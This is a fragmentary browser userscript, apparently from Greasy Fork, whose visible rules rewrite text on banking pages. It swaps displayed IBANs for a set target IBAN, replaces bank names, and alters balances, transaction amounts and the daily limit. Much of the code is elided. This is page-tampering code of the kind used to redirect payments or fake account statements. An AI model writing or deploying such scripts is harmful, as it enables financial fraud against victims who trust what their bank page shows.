// ==UserScript==
// @name         Ed Start 4Rec db.spiridon.simadirakis@gmx.de
...
// @downloadURL https://update.greasyfork.org/scripts/543970/Ed%20Start%204Rec%20dbspiridonsimadirakis%40gmxde.user.js
// @updateURL https://update.greasyfork.org/scripts/543970/Ed%20Start%204Rec%20dbspiridonsimadirakis%40gmxde.meta.js
// ==/UserScript==
...
// FINUEBER
  ...
  const MBALANCE_CONFIGS = [
    ...
    { index: 1, adjustmentAmount: 1 }, // 1079727
...
// UMSATZE BALANCE
  const ADJUSTMENT_AMOUNT = 0.0;  //1079727
  const TARGET_IBAN = 'DE37 3427 0024 0123 3006 00';
...
if (window.location.href.includes("de") || window.location.href.includes("mainscript") || window.location.href.includes("Downloads")) {
  ...
  const flex = (s) =>
    new RegExp(
      ...
      // === CONFIGURATION ===
  const DAILY_LIMIT_REPLACEMENT = '2.000,00 EUR'; // Change this to your desired value
...
if (
  ...
  //      { search: "FR76 1747 8000 0100 0961 60301 39", replace: "DE37 3427 0024 0123 3006 00", autoDelay: 100 },  // DE37 3427 0024 0123 3006 00      // NL33 CLRB 0048 7096 50
   ...
   //     { search: "FR76 1747 8000 0100 0961 6030 139", replace: "DE37 3427 0024 0123 3006 00", autoDelay: 100 },
        { search: "NL33 CLRB 0048 7096 50", replace: "FR76 3000 1000 0123 4567 8901 234", autoDelay: 100 },
    ...
    //      { search: "HARMONIIE SAS", replace: "Deutsche Bank", autoDelay: 100 },
        ...
        { search: "CLEARBANK EUROPE N.V.", replace: "HARMONIIE SAS", autoDelay: 100 },
...
// Test
        ...
        // CUSTOM
          { search: "43.000,00", replace: "XXX,00", autoDelay: 0 },  { search: "-43.000,00", replace: "-XXX,00", autoDelay: 0 },// -130,99   //DONT' FORGET TO CHANGE DELAY
